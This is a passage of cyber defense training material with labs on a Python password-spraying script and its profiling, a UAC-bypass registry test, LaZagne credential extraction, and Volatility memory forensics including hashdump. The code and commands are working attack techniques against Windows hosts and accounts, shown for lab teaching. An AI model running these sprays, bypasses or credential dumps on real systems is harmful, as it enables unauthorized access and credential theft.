                finalpassword = password
                break
    print("{} is a valid password for user {} on machine {}".format(finalpassword,args.user, ip))
﻿

7. Save the file as sprayer.py and exit the text editor.

﻿

8. Make the script executable by entering the following command:

chmod +x sprayer.py
﻿

9. Run this script against the target domain with the following command:

./sprayer.py --user eve.tran --domain energy.lan --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2
﻿

Use the information from this lab to answer the following question.




Profiling Test Scripts with Python
Introduction to Python Profiling
﻿

According to official Python documentation, "cProfile and profile provide deterministic profiling of Python programs. A profile is a set of statistics that describes how often and for how long various parts of the program executed."

﻿

Python profiling is a developer tool that gauges the efficiency of code performance by comparing runtimes. It compares different code that performs the same function to determine whether runtimes increase or decrease with changes to a tool’s algorithms. For small projects, these efficiencies can be negligible. For large jobs, such as sending a million authentication requests to a target server, improving efficiency saves an attacker hours. Similarly, from the blue team perspective, writing code that efficiently parses millions of lines of logs saves an overworked defensive team just as much time. 

﻿

Using profiling to test loop algorithms is a common practice for malicious tool developers, especially when the speed of the attack is a significant factor for success. This is often the case when an adversary is racing against the time it takes defenders to identify a potential threat and respond to an alert with an investigation and potential containment. 

﻿

The next two labs prepare and profile two loop algorithms for an attack script. The first lab creates an alternative loop algorithm based on the original attack script. The second lab profiles the two algorithms to identify the more efficient loop.

﻿

Modify an Attack Script for Profiling
﻿

Duplicate an existing attack script, then modify the duplicated script by rearranging its nested loops. 

﻿

Workflow
﻿

1. Log in to the VM kali-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a terminal.

﻿

3. Create a copy of the attack script sprayer.py from the previous lab and name it sprayer2.py.

﻿

4. In the script sprayer2.py, scroll to the code block displayed in Figure 14.1-1, below:\

![image](https://github.com/user-attachments/assets/e9e105e2-3d72-41c2-8284-4491d21119b2)



Continue working in the script sprayer2.py to complete steps 5-10, which modify the code block displayed in Figure 14.1-1.


5. Insert the following code immediately before the line for ip in args.ip:
with open(args.passwordfile,'r') as passwordfile:
    for password in passwordfile:
        password = password.strip()



6. Remove the line that follows for ip in args.ip: and begins with print("Testing passwords


7. Remove the three lines that follow finalpassword = 'No entry in password file', from with open(args.passwordfile,'r') to password.strip()


8. Remove break from the line that follows finalpassword = password


9. Add the following two lines immediately after the line that begins with print("{} is a valid
        if passwordvalidity:
            break



10. Remove any blank lines in the modified code block so that the final block is written as follows:
with open(args.passwordfile,'r') as passwordfile:
    for password in passwordfile:
        password = password.strip()
        for ip in args.ip:
            finalpassword = 'No entry in password file'
            passwordvalidity = check_pwd(ip,args.user,password,args.domain)
            if passwordvalidity:
                finalpassword = password
                print("{} is a valid password for user {} on machine {}".format(finalpassword,args.user, ip))
        if passwordvalidity:
            break



Ensure the modified code block matches step 10, before moving on to the next lab.


11. Save the file as  sprayer2.py  and exit the text editor.


Profile Attack Algorithms


Continue working in a terminal in kali-hunt. Compare different methods for completing a brute force attack to determine the fastest method. Attempt each attack by brute forcing multiple passwords against multiple hosts. Determine the runtime of each algorithm.


Workflow


1. Run each script by entering the following, allowing 5 minutes to complete:
python3 -m cProfile ./sprayer.py --user malik.freeman --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2 172.16.4.3 172.16.4.4 --domain energy > script1results.txt


python3 -m cProfile ./sprayer2.py --user malik.freeman --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2 172.16.4.3 172.16.4.4 --domain energy > script2results.txt



2. Display the results of each script with the following commands. 
head script1results.txt

head script2results.txt



Figure 14.1-2, below, highlights where the algorithm runtime is listed in each output.


![image](https://github.com/user-attachments/assets/05c63bf7-e74a-4dd6-b0ef-c888f9fbcbbb)




It is possible that Python has optimized processes in the background, leading to very similar results between the scripts. The link in the Additional Resource section of this task provides additional tests to complete. Regardless, these two labs highlight the effect a small amount of tuning has in the performance of Python on large scales. This is relevant to both attackers and defenders who may use Python to accomplish tasks across a whole network.


Additional Resource


#########CDAH-M14L2-Building a Tool with Python#############


Script Complexity
Programming, which includes scripting, can be categorized into three levels of complexity: basic, moderate, and complex. Before diving into scripting with Python, this lesson begins by illustrating the best practices for writing code for each of these levels of complexity. Many of these practices are also part of the PEP 8 – Style Guide for Python Code. The recommendations in this lesson allow programmers to share and review each other's code more easily and efficiently, which helps ensure the scripts are functional and effective.

﻿

For the most part, all best practices that apply for simple projects apply just as well to more complex projects. Simple coding and scripting best practices are universally useful, regardless of the size of a project. However, the best practices for more complex scripts may be unnecessary or inefficient for smaller and simpler projects. The Scripting Best Practices attachment provides a comparative summary of the best practices introduced in this lesson.


 Best Practices for Simple Scripts
Simple projects begin with building a tool for a single function. For example, the function may be to download and extract a file from the internet on a Linux host. The code for this simple function may be written as follows:

import os
# Downloads and extracts a file
os.system("curl http://github.com/https://github.com/SpiderLabs/HostHunter/releases/download/v1.6/hosthunter_v1.6.tar -o hosthunter_v1.6.tar")
os.system("tar -xvf hosthunter_v1.6.tar")
﻿

Simple scripts have simple best practices that primarily focus on improving readability.

﻿

Improving Readability
﻿

Short, consistently-spaced lines of code are easy to read. This is why each line of code should be limited to a maximum of 79 characters. Additionally, Python syntax requires indentation for specific blocks of code. PEP 8 recommends adding four spaces for each level of indentation that a code block requires. The following code block exemplifies both of these best practices for improving readability in a simple script. The second line is indented by four spaces while the third line is indented by an additional four spaces, totalling eight spaces before the code begins:

def readfile():
    with open("file1.txt", "r") as data:
        for i in data.readlines():
            print (i)
﻿

Implementing a standard for indentation discourages programmers from indenting inconsistently across projects and making code difficult to read. The following is an example of incorrect indentation. This code block adds two tabs for each level of indentation instead of four spaces. Spacing each indented line this far apart decreases readability:

with open("file1.txt", "r") as data:
    for i in data.readlines():
        print (i)
﻿

NOTE: In a scripting environment, the tab size can be configured to use four spaces; this is considerably easier than adding four spaces per indentation.﻿

﻿

Cybersecurity professionals generally use simple scripts to perform specific tests and functions. These best practices for creating high quality, simple scripts set the foundation for advanced script-building. Regardless of scripting complexity or language, the golden rule is to main tain readability. Reviewing and updating code is cumbersome when a script is unintelligible.
 ﻿


﻿![image](https://github.com/user-attachments/assets/de1489d7-1d43-49c4-bea3-17898be5c178)


 Compartmentalizing Components


Moderate Python scripts are similar to traditional Object-Oriented Programming (OOP). OOP describes a programming style in which developers create a robust program or application based on a core piece of data or concept. The first example of a simple project was for a function that downloads and extracts a file from the internet on a Linux host. This example can be transformed into OOP by separating the tasks the program performs into individual functions, as follows:
import os
def downloadfile():
	os.system("curl http://github.com/https://github.com/SpiderLabs/HostHunter/releases/download/v1.6/hosthunter_v1.6.tar" -o hosthunter_v1.6.tar)
	extractfile()

def extractfile():
	os.system("tar -xvf hosthunter_v1.6.tar") 
#Call the functions for execution
downloadfile()





Scripts that are moderately complex include more structured pieces such as classes and methods. Python best practices recommend placing these components in separate files and calling them into other scripts. This allows programmers to troubleshoot, improve, and maintain individual parts of the program, rather than having to manage a massive script in its entirety.
 
Performing Unit Tests


As scripts increase in complexity, they also become more vulnerable to regression. Regression occurs when fixing bugs in the code creates new ones. Unit testing is one way to prevent regression. A unit test is a Python module wherein programmers call parts of their code, declare what the code is expected to output, and then perform tests to check whether or not the called section of code runs correctly. Unit testing is a robust technique that is highly recommended for frequent Python users, however it is not covered in depth in this lesson. 



![image](https://github.com/user-attachments/assets/965d3bc7-2138-4f82-9e31-84b82da6f304)


![image](https://github.com/user-attachments/assets/356de367-0d08-42eb-b744-230c812547d1)


Best Practices for Complex Scripts
Using Parent Classes
﻿

Python scripts become complex when a complete Python program consists of multiple maintained programs. A recommended practice for these complex projects is to store common objects in a parent class. This is similar to how imported modules and programs are stored. Modules are miniature programs that solve a specific function, such as converting a measurement from imperial to metric. Other programs can then import these modules. A programmer may call a specific module whenever its operation needs to be performed. 

﻿

Dating code comments and documenting the use of individual modules is critical at this point, to help programmers troubleshoot in the future. As an example, programmers may refer to the dates and documentation to identify code that has been written to solve a business need that is no longer required or code that references older versions of Python that no longer function.

﻿

Maintaining Documentation
﻿

Documenting environment versions and date of creation helps track changes to the code, which is especially important when maintaining multiple environments. Python comes in different versions and environments that can be built in many different ways. Any bugs in the core code of Python can affect how programs function in each of these environments. Documenting environment versions also helps code reviewers assess any impact of code improvements on programs.

﻿

Imported third-party modules and other code dependencies also need to be documented. Programmers have very little, if any, control over these tools, so they rely on the documentation. Documenting the versions of a specific module helps debug code that malfunctions due to updates from external sources. 

﻿

Docstrings
﻿

Documentation in Python is referred to as a documentation string, or docstring. PEP provides a style guide for properly documenting Python for readability. A docstring is placed within a function or class between a set of triple quotes, as in the following example:

def complex(real=0.0, imag=0.0):
    """Form a complex number.

    Keyword arguments:
    real -- the real part (default 0.0)
    imag -- the imaginary part (default 0.0)
    """
    if imag == 0.0 and real == 0.0:
        return complex_zero
    ...
﻿

Docstrings are commonly confused for multiline comments because they are both types of comment code. Both docstrings and multiline comments provide information about the surrounding code in a series of non-executable lines. However, a docstring operates differently than a multiline comment. A docstring is accessible within a running Python program. On the other hand, a multiline comment is not accessible while a script runs. To turn a multiline comment into a docstring, it must be created within a function or a class.

﻿

The docstring from the example above can be printed with the following code while the Python complex function runs:

print (complex.__doc__)
﻿

Proper code documentation eliminates the need to read functional elements during review and troubleshooting. This, in turn, minimizes the time it takes for people to parse the code when debugging and improving previously written code. 



![image](https://github.com/user-attachments/assets/a046ad47-c9c9-4608-8c69-3b4fdca615ed)


![image](https://github.com/user-attachments/assets/527aee3d-17a0-415c-8404-8ccbbee78117)




Python and MITRE ATT&CK
The MITRE ATT&CK framework is a collection of the TTPs that cyber actors have used in cyber attacks. A handful of publicly available Python modules use the MITRE ATT&CK framework to assist with testing MITRE's list of TTPs in an environment. Modules that are available on GitHub include pyattck, mitreattack-python, and Red Canary's Atomic Red Team library of tools. Using these tools is the fastest way to check whether an environment is protected against a specific technique or vulnerable to that technique.

﻿

Atomic Red Team Tools
﻿

The Atomic Red Team tool library provides offensive cyber tools that are mapped based on the attack methods documented in the MITRE ATT&CK framework. The Atomic Red Team GitHub page stores all configuration information in YAML Ain’t Markup Language (YAML) file formats that can be imported into other scripts to automate MITRE tests. Figure 14.2-1 displays some of the information listed in the YAML file for T1548.002.


﻿![image](https://github.com/user-attachments/assets/fa1ac05a-4c72-4c3a-b114-8d3f8b167de4)

 Figure 14.2.2, below, displays the information provided in the command and cleanup_command sections of the YAML file for T1548.002. The command section provides the commands for performing the test. The cleanup_command section removes the artifacts from the system that are created when the command section runs.



![image](https://github.com/user-attachments/assets/9d04d085-c4de-4ebf-a73a-c142db9d8bf5)



In Figure 14.2-2 above, the #{executable_binary} parameter needs to be replaced with a binary that requires UAC permissions.


The following code implements the commands from the YAML file in the previous two figures. This code determines whether or not a system is vulnerable to a User Account Control (UAC) bypass allowing for privilege escalation:
import os
os.system("reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d cmd.exe /f")
os.system("cmd.exe /c eventvwr.msc")



Next is a lab that continues using the example YAML file for MITRE T1548.002 and places this information in Python format.


Run MITRE Tests with Python


Open a new Python project, import the command line arguments provided from the Atomic Red Team project, and run a sample script.

Workflow


1. Log in to the Virtual Machine (VM) win-hunt using the following credentials:
Username: trainee
Password: CyberTraining1!



2. From the desktop, open Pycharm Community Edition.


3. In the PyCharm Welcome window, select New Project.


4. In the Location field, replace the project name pythonProject with UACBypass, then select Create.


![image](https://github.com/user-attachments/assets/c79b7aed-bf38-41c8-8db4-ddc232f1ec4d)

5. From the folder tree in the left pane, expand UACBypass to navigate to and select the main.py script.


Python includes sample text by default to start any new Python script. However, this lesson uses code provided by Atomic Red Team for test number one of T1548.002 - Abuse Elevation Control Mechanism: Bypass User Access Control. 


6. Create a blank script file by selecting and deleting all the text on lines 1-16 of main.py.


7. From the toolbar at the top of the window, select File, then Open.


8. In the Open File or Project window, expand the following sequence of folders to fin d T1548 .002.yaml:
Users
trainee
Documents

9. Select T1548.002.yaml from the folder tree, then select OK to open the file.


T1548.002.yaml is a configuration file from the Atomic Red Team project. This YAML file contains the command line required to run a test for the T1548.002 TTP.


10. From the open file T1548.002.yaml, copy the contents of lines 18 and 19, which display the following:
reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f

cmd.exe /c eventvwr.msc



To execute the test, analysts must replace the "#{executable_binary}" placeholder text in the first line with an up-to-date malicious file. It is convenient that only this portion of the command needs to be edited to run the test. However, editing each additional test becomes tedious when analysts need to execute different programs over multiple tests. It is simpler to create a script in a programming language like Python. 


In this lab, instead of modifying and saving the script before running each new test, analysts can manually enter the binary for a script to run by placing the commands from lines 18 and 19 into the script. Analysts may also choose to automate the test further by creating a list of applications to test, then iterating through that list.


11. Paste the copied contents from lines 18 and 19 into main.py.


12. Modify the pasted content from the previous step so that main.py displays only the following code:
import os

os.system("reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d " + input("Enter a process name (cmd.exe): " ) + " /f")
os.system("cmd.exe /c eventvwr.msc")

13. Execute the script by selecting run in the upper-right corner of the window, as highlighted in Figure 14.2-4, below:


![image](https://github.com/user-attachments/assets/0dbc9c0b-f137-4554-b19b-8187f42bbc23)


Executing the script presents an output at the bottom of Pycharm that prompts for a binary to run.


14. Enter cmd.exe on the prompt line and press enter.


The output confirms that the script ran successfully. Running the script also causes Windows Defender to display a pop-up that states the attack has been blocked and removed, as displayed below in Figure 14.2-5. Since Windows Defender is able to successfully block and mitigate the threat, this indicates that the system is not vulnerable to T1548.002 test #1.



![image](https://github.com/user-attachments/assets/f536d605-9f01-4651-a867-c100e945e088)



![image](https://github.com/user-attachments/assets/fa0d5209-7f44-4676-b1b4-6d9580a204af)


Automating Forensic Collection
Collecting artifacts for cyber forensics is a constantly evolving process, improved upon and maintained by many professionals in the cybersecurity industry. It is impossible for one person to develop and code all of the new techniques discovered by security professionals to use in data collection. This is one reason investigators often incorporate scripts and other technical information into their own simpler scripts, rather than writing all new code themselves.

﻿

Python is a great tool for scripting new forensic artifact collection tools into an automated process, per the requirements of a given organization. For example, if a novel memory collection method is discovered and shared publicly, different law enforcement organizations and security personnel may choose to incorporate these new methods into their own scripts to meet specific organizational needs. 

﻿

Scripting forensic collection with Python also allows analysts to process large datasets, all at once. For example, an analyst may need to investigate 1,000 security camera clips for a potential suspect. Instead of watching all those clips, the analyst could reduce investigation time by integrating an image processing script into a Python script that tags any clip with a person in it.



Collecting Artifacts with Python
Analysts have many options to automate the collection of forensic artifacts, such as the open source tools that are available online. Additionally, custom Python scripts can be written to address any gaps, should analysts need to collect specific artifacts not addressed by predefined scripts. 

﻿

The next section provides a sample of various code snippets that can be entered into the Windows command line utility in a Python script. These snippets extract forensic information from the following Windows sources:

Registries
Directories
Command line utilities and files
A lab is also provided to learn how to extract the passwords saved on a Windows host.

﻿

################Registries#####################
﻿

The following code queries the Windows registry and reads keys from specific registry locations:

import os
os.system("reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run")
﻿

The Windows registry can also be accessed directly without using the underlying Windows command line by running the python-registry module with the following code:

from Registry import Registry
reg=Registry.Registry("C:\\Windows\\System32\\config\\SOFTWARE")
key = reg.open(r'Microsoft\Windows\CurrentVersion\Run')
for data in [val for val in key.values() if val.value_type() == Registry.SZ or val.value_type() == Registry.RegExpandSZ]:
	print (data.name(), data.value())
﻿

This code prints out the data contained in the SOFTWARE hive's Run key, which is executed when a user logs into the machine.


![image](https://github.com/user-attachments/assets/efb6e7a7-9717-4f3d-aff0-78c81f73ae37)

﻿

##############Directories##################
﻿

The following code obtains a file list of the C:\Users\Public\Documents directory:

import os
os.system('dir /a /s /b C:\Users\Public\Documents')
﻿

Use Python's os.walk module with the following code to obtain the file list without using the underlying Windows command line:

import os
for root, dirs, files in os.walk("C:\\Users\\Public\\Documents"):
	for name in files:
		print (name)


 ![image](https://github.com/user-attachments/assets/d41027a5-69bd-463a-a67c-4585b87d1ed2)


##############Commands and Files##################
﻿

Python offers the ability to use regular expressions to extract information. The following code leverages this feature by using regular expressions to extract only IP addresses and count the total addresses from the Windows systeminfo utility:

import os,re

os.system('cmd.exe /c systeminfo > output.txt')
ips = []
with open('output.txt', 'r') as data:
	for i in data.readlines():
		for z in re.findall('[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}', i):
			ips.append(z)
print (len(ips))
﻿

![image](https://github.com/user-attachments/assets/7d11ee51-bc3a-43e7-8110-421cc6ecb186)



Workflow


1. Log in to the VM win-hunt using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Open a command prompt.


3. Run the script for The LaZagne Project without any parameters by entering the following command:
python "C:\Users\trainee\Documents\LaZagne-master\Windows\laZagne.py"



The output from this command displays the different Windows tools and options for finding passwords on the host. 


4. Open Pycharm Community Edition.


5. From the top left of the window, select File, then select New Project near the search bar. 


6. Replace the highlighted pythonProject path text with PasswordExtractor, then select Create.
When prompted, choose This Window.

7. Select and delete all text on lines 1-16 of  main.py  to create a blank script file.


8. Enter the following code to extract any passwords on the system with laZagne.py and store the results and passwords in dedicated files:
import os,re

passwords = []

os.system("python C:\\Users\\trainee\\Documents\\LaZagne-master\\Windows\\laZagne.py all > results.txt")

with open('results.txt', 'r') as results, open('pw.txt', 'w') as pw:
    for i in results.readlines():
        for data in re.findall('Password:.*', i.strip()):
            pw.write(data)
            passwords.append(data)
print ("The passwords found are: ")
for passw in passwords:
    print (passw.split(":")[1])

     
This script stores the entire utility output in the file results.txt and stores only the passwords in the file pw.txt.


9. Execute the script by selecting the run icon from the menu at the top.


After a few seconds, the results should display two passwords. Additionally, both results.txt and pw.txt are stored in C:\Users\trainee\PycharmProjects\PasswordExtractor\


After creating the PasswordExtractor script, forensic analysts can edit its commands to expand its functionality or include it in other Python scripts for future investigations.


Use the information from this lab to answer the next question.


Overview of the Volatility Framework
CDAs are generally focused on discovering how a system was compromised, and what was accessed or stolen from a system. Often, the only location where this information resides is in memory. Objects stored in memory such as running processes are unrecoverable after a system is shut down unless they are captured in a memory dump or hibernation file. Even if a memory dump is available for analysis, many questions come to mind, such as how to analyze it, what it contains, and what tool(s) are needed. The answer to those questions lies within the Volatility framework. 

﻿

Volatility is the most widely used framework for extracting digital artifacts from volatile memory, also known as RAM. There are two commonly-used versions of Volatility: version 2 was released in 2007 and maintained until 2016, and version 3 was released in 2019 and is the current version that is continuously updated by the Volatility Foundation. Volatility 3 is still in development and is missing some of the functionality of version 2, which is why the main focus of this training is using Volatility 2. Volatility supports Windows, Mac, Linux, and Android Operating Systems (OS). Both Linux and Android require a custom profile to be created for the memory image to be read by Volatility.

﻿

Windows users have two options for using Volatility. The standard version uses Python, and the executable version of Volatility comes pre-wrapped with the default plugins and profiles. 

﻿

Volatility Symbols/Profiles
﻿

Symbols and profiles are the defining structures unique to each version of the OS and the architecture of where information in the memory is stored. Volatility has preconfigured the most common OS platforms and versions in symbols/profiles. Volatility 3 refers to these structures as symbols and Volatility 2 as profiles.

﻿

For example, a 32-bit version of Windows 10 has a different memory address space than a 64-bit version of Windows 10. If the incorrect profile is selected, Volatility may not be able to extract information from the memory image. It can be quite frustrating trying to determine which profile the memory image belongs to. The developers of Volatility 3 took that into account during its development and created the ability for Volatility 3 to automatically detect which profile/symbol pack is needed to analyze the image. If the symbol pack is not in the current installation of Volatility 3, the Volatility application automatically downloads the correct profile when the image is being analyzed but does not automatically download symbols for the Linux images. The most common Linux distributions and Mac versions have profiles available for download from Volatility’s website.

﻿

Volatility 2, on the other hand, requires the analyst to determine which profile to employ by using the imageinfo plugin to read the image. Sometimes the profile does not exist even under Volatility 3, and the profile needs to be manually created. Most versions of Linux need a custom profile created.

﻿

Creating a Custom Profile
﻿

Due to the multiple Linux distributions, Volatility does not have a default profile to support all Linux versions. The process of creating a custom profile is challenging at first but highly recommended to understand.

Install the exact kernel version of Linux in a Virtual Machine (VM) that matches the memory image.
Download the latest version of Volatility inside the VM.
Install dwarfdump if not already installed.
Navigate to the volatility/tools/linux/ directory.
Execute the make command.
Back out of the volatility directory to the parent directory (cd ../../../).
Run the following command to create the profile: 
zip $(lsb_release -i -s)_$(uname -r)_profile.zip ./volatility/tools/linux/module.dwarf /boot/System.map-$(uname -r)

This generates a profile by creating a zip file that includes the module.dwarf file and the  System.map  file for the specific Linux distribution and kernel version. This profile can then be used by Volatility to analyze memory dumps from Linux systems.

Copy the VERSION_profile.zip file to the volatility/volatility/plugins/overlays/linux directory.
Run vol.py –info to verify the profile is in Table 14.3-1:

![image](https://github.com/user-attachments/assets/b6997fbd-3d5b-4c6c-aed1-f9f850ba80c1)


Plugins


The power of Volatility is in the plugins. The plugins listed in Table 14.3-2 search through the memory image to find information of value and provide context of where that information originated.



![image](https://github.com/user-attachments/assets/681fc6d3-a9dc-46b1-a73c-fd370eefe487)


Many plugins do not ship with Volatility by default. Most were created from competitions hosted by the Volatility Foundation that take place each year. One plugin that is not standard in Volatility 2 is called bitlocker and extracts the Windows BitLocker key out of memory so that it can be used to decrypt the hard disk. These additional plugins are downloaded from Volatility’s Github repository and placed within the appropriate folder to work on a local installation of Volatility.


Differences between Volatility 2 and 3


![image](https://github.com/user-attachments/assets/e34afc27-d78b-4b89-b890-b1f1f9bf69e4)




Volatility 2 and 3 each have minimal syntax differences. Volatility 2 does not require a label in front of the plugin name for Windows memory images. Volatility 3 plugins are prepended with the windows. label. The following command displays all the local user accounts and their password hashes from memory:
Volatility 2: python2.7 vol.py -f memoryfile.raw hashdumpVolatility 3: python3 vol.py -f memoryfile.raw windows.hashdump
Volatility 3 does not require providing a profile as Volatility 2 does:
Volatility 2: python2.7 -f memoryfile.raw –profile=Win10x64_19041 pslistVolatility 3: python3 -f memoryfile.raw windows.pslist
NOTE: For Volatility 2, the imageinfo plugin should be run to attempt to detect the correct profile. 


To see all of the available plugins, run the following command:
Volatility 2: python2.7 vol.py –infoVolatility 3: python3 vol.py -h


![image](https://github.com/user-attachments/assets/770117d7-e28e-42a6-ab26-9d76f57794c1)

![image](https://github.com/user-attachments/assets/b02809dc-95af-4f08-b482-24486c1387fc)

![image](https://github.com/user-attachments/assets/686d43f5-2dc1-403f-bae5-4fe2b7a54818)


![image](https://github.com/user-attachments/assets/357dc40c-f057-4d40-8cf1-85c00b880f6e)



Finding Artifacts in a Memory Dump
When analyzing a memory image with Volatility, first determine the profile that is compatible with the image. The imageinfo plugin allows Volatility to examine the imageusing additional plugins.  

﻿

Detecting the Profile
﻿

Running the following command tells Volatility to detect the required profile:

python2.7 vol.py -f memory image.raw imageinfo
﻿

Volatility returns multiple profile options. It is best to know which OS the image uses to select the correct profile. 

![image](https://github.com/user-attachments/assets/ef67fca6-4428-44b3-8c05-804116191503)


Also, by running python2.7 vol.py -f memoryimage.raw –info, the list of profiles available is displayed.


If Volatility cannot determine the profile, select one from the list of profiles if it is known which profile to use. It is possible that there is an error with the image or additional steps may need to be taken to use that image. For example, if a Windows 10 hibernation file is taken directly from a Windows 10 host and read with Volatility, it fails because the file is compressed. A third-party tool (Hibr2Bin) needs to be run before Volatility can examine the image. It may be necessary to run the strings utility against the image manually, looking for Windows and a version number to find the correct version.


Extracting Artifacts


After the profile is found, the profile and a plugin that correlates to the information to be gleaned from the image must be specified. Some plugins have multiple parameters required. The -h parameter is used to see which ones are required. For example, the dumpfiles plugin requires a process ID, Regular Expression (regex), or a memory address along with an output directory to save the file:
python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 dumpfiles -h

Process List


There are three plugins that provide information about which processes were running at the time of the memory capture: pslist, pstree, and psxview.


![image](https://github.com/user-attachments/assets/83284845-8e62-4b16-99b7-4c62a7697988)


Typically, pslist or pstree are all that is needed, but psxview is particularly useful when there are processes that are hidden due to a rootkit or similar type of malware:
python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 pslist
python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 pstree
python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 psxview



Process Command Line


This plugin displays the full file path of a running process and which parameters were provided at the time it ran. For example, a malicious file running from an unusual directory has the filename of a legitimate application. The Process Command Line (cmdline) plugin displays the command lines to help identify the malicious process. This also works well when the process running is a word processing software application, and the goal is to determine which file was open at the time of the capture.
python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 cmdline



Process Dump


The Process Dump (procdump) plugin extracts the binary that was running in memory and saves it to disk. This is useful for malware analysis, creating Indicators of Compromise (IOC), and so on.
python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 procdump -p processidnumber -D destinationtosavethefile



Memory Dump


The Memory Dump (memdump) plugin works best when an application such as notepad.exe is open, and there is some text in it, but the file has not been saved or written to disk. The memdump plugin extracts any data in the memory of the notepad.exe process.
python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 memdump -p processidnumber –dump-dir destinationtosavethefile



Master File Table


The Master File Table (MFT) on Windows stores a record of all files modified, created, or deleted since the installation of the OS. The MFT Parser (mftparser) provides that information to a defender to view files, dates/times, and the file attributes associated with those files. This is used to build a clear picture of activity in a given time range and to potentially identify files of interest that may be worth investigating further.
python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 mftparser



File Scanner


The File Scanner (filescan) plugin searches through the memory image, looking for files that are available within the image and obtains their physical address in memory. This address is used to extract the file out of memory and write it to the trainee’s workstation.
python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 filescan



Dumping Files


The ability to extract files out of a memory image is incredibly useful when investigating a malware case such as opening a malicious Microsoft Word document. The Dumping Files (dumpfiles) plugin, when used in conjunction with the filescan plugin, allows the file to be extracted from memory to be analyzed later for further IOCs.


The two main options are to use a regex to find a file within a specific process or to extract a file by its physical memory address.
Regex

python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 dumpfiles -p processidnumber -r REGEXOFFILENAME -n -D destinationtosavethefile

Physical Address

python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 dumpfiles -Q MEMORYADDRESS -n -D destinationtosavethefile



The -n option keeps the filename the same as it is in memory. Otherwise, Volatility names the file as the memory address, which may be difficult to recall what file was extracted.


Network Connections


The plugins for discovering the network state of the host during the image capture are limited to three plugins: netscan, connections, and sockets. Each plugin is only valid on selected Windows versions, as shown in Table 14.3-5. 

![image](https://github.com/user-attachments/assets/6606f54b-506c-42a4-9ed0-1a78e69f9f75)




The output of these commands is similar to the Windows netstat command, which shows the Internet Protocol (IP) address of the client, remote host, source and destination ports, process name, process ID, and date the connection started. 
python2.7 vol.py -f memoryimage.raw –profile=WinXPSP2x86 connections
python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 netscan
python2.7 vol.py -f memoryimage.raw –profile=WinXPSP2x86 sockets



The only difference between these plugins is that connections and netscan plugins only produce Transmission Control Protocol (TCP) connections whereas sockets produces connections including TCP, User Datagram Protocol (UDP), and raw connections.


Credential Dumping


This plugin may seem like it is only for offensive purposes, but CDAs use it, too. The hashdump plugin extracts the username and password hashes of all local accounts on the system at the time of the memory capture. This information is useful to determine whether a new account was added to the system, or if the administrator account had a blank or weak password.
python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 hashdump



Unique Strings


The Unique Strings (strings) plugin is useful for searching through a memory image for specific strings to see if they exist. It could be an IP address, part of a word, or filename. Sometimes finding a remnant of known activity is all that is needed to prove there was potentially Malicious Cyberspace Activity (MCA) on the system at one point. Unfortunately, the strings plugin does not show where the content comes from within the image to provide context, strictly showing if there is a match.
python2.7 vol.py -f memoryimage.raw –profile=Win10x86_10941 
string
s -s listofartifacts.txt

![image](https://github.com/user-attachments/assets/5546e4ad-5fd6-4941-b05c-88d69b7d6ed8)



![image](https://github.com/user-attachments/assets/f3075d87-46a3-4b2a-ae34-f471b820c7c6)




2. Open a terminal and execute the following to change into the volatility-master directory:
cd volatility-master

![image](https://github.com/user-attachments/assets/79da11b3-7806-4cf0-a389-84c49b5dca72)


3. Execute the following to obtain a list of running processes:
python vol.py -f ~/Desktop/Triage-Memory.mem --profile=Win7SP1x64 pslist

![image](https://github.com/user-attachments/assets/4754fd79-0f93-4f0c-947d-4882045a8036)


4. Execute the following to obtain the process ID of the notepad.exe process:
python vol.py -f ~/Desktop/Triage-Memory.mem --profile=Win7SP1x64 pslist|grep notepad

![image](https://github.com/user-attachments/assets/e2bfefa7-58da-4131-818a-4c61ab91568a)

5. Execute the following to dump the memory of the notepad process to disk:
python vol.py -f ~/Desktop/Triage-Memory.mem --profile=Win7SP1x64 memdump -p 3032 --dump-dir /home/trainee/


![image](https://github.com/user-attachments/assets/c9b17da7-da01-42ac-8a66-b8d05e2c48a4)


6. Execute the following to search through the newly created dump file via strings and regex:
strings -el ../3032.dmp |egrep 'flag<R'

![image](https://github.com/user-attachments/assets/889bf048-1329-49f9-a69c-5cc5edcc1013)

![image](https://github.com/user-attachments/assets/3136e0ae-2792-48ca-8071-f28e4eadbce4)


#####step 4############


2. Edit the voldump.py script located in the /home/trainee/Desktop/results folder and add the plugins listed on line 4 to automate their execution:
plugins = ['psxview', 'pstree', 'netscan', ' malfind', 'mftparser', 'filescan', 'dlllist', 'cmdscan', 'cmdline', ' shimcache', 'shellbags']

![image](https://github.com/user-attachments/assets/63841119-ecca-4303-ab21-ae2124a7d2e9)

3. Open a terminal and change to the directory where voldump.py was saved:
cd /home/trainee/Desktop/results



4. Run the following command to execute the list of plugins mentioned in Step 2:
python voldump.py ~/Desktop/Triage-Memory.mem Win7SP1x64

![image](https://github.com/user-attachments/assets/f6d58f76-63cb-4020-bdd7-d55ce548ea73)

![image](https://github.com/user-attachments/assets/3f757b29-eea0-4ff0-b490-13abadc83a4a)

5. Once the script is complete, verify the current directory contents to ensure the text files were created:
ls *.txt



6. Review the predefined list of IOCs used for searching within the image to become familiar with them:
cat ~/Documents/IOCs.txt

![image](https://github.com/user-attachments/assets/eb018514-be8e-4037-a4b7-30dfb7e0f22e)





7. Run the following command to use the previously mentioned list of IOCs to search the output generated by voldump.py:
